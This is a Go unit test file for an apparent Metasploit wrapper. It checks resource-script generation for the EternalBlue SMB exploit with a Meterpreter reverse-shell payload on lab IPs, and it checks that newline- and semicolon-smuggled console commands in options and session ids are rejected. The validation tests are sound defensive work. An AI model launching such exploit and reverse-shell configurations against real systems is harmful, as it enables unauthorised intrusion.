package metasploit

import (
	"strings"
	"testing"
)

func TestBuildResourceScript(t *testing.T) {
	s, err := buildResourceScript(ModuleSpec{
		Module:  "exploit/windows/smb/ms17_010_eternalblue",
		Target:  "10.20.0.5",
		Payload: "windows/x64/meterpreter/reverse_tcp",
		Options: map[string]any{"LHOST": "10.20.0.9", "LPORT": 4444},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"use exploit/windows/smb/ms17_010_eternalblue",
		"set RHOSTS 10.20.0.5",
		"set PAYLOAD windows/x64/meterpreter/reverse_tcp",
		"set LHOST 10.20.0.9",
		"set LPORT 4444",
		"run -z",
		"sessions -K", // mandatory teardown must be in every script
		"exit -y",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("script missing %q:\n%s", want, s)
		}
	}
}

func TestBuildResourceScriptRejectsInjection(t *testing.T) {
	// An option value carrying a newline would inject an extra console command.
	_, err := buildResourceScript(ModuleSpec{
		Module:  "exploit/x/y",
		Target:  "10.20.0.5",
		Options: map[string]any{"EVIL": "x\nsessions -u -1"},
	})
	if err == nil {
		t.Fatal("a newline in an option value must be rejected")
	}
}

func TestStopSessionArgsRejectsUnsafeID(t *testing.T) {
	if _, err := stopSessionArgs("1"); err != nil {
		t.Errorf("a plain id should be accepted: %v", err)
	}
	for _, bad := range []string{"1; sessions -K", "1 -K", "x\ny"} {
		if _, err := stopSessionArgs(bad); err == nil {
			t.Errorf("unsafe session id %q must be rejected", bad)
		}
	}
}

func TestTeardownArgs(t *testing.T) {
	args := teardownArgs()
	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "sessions -K") {
		t.Errorf("teardown must kill all sessions: %v", args)
	}
}
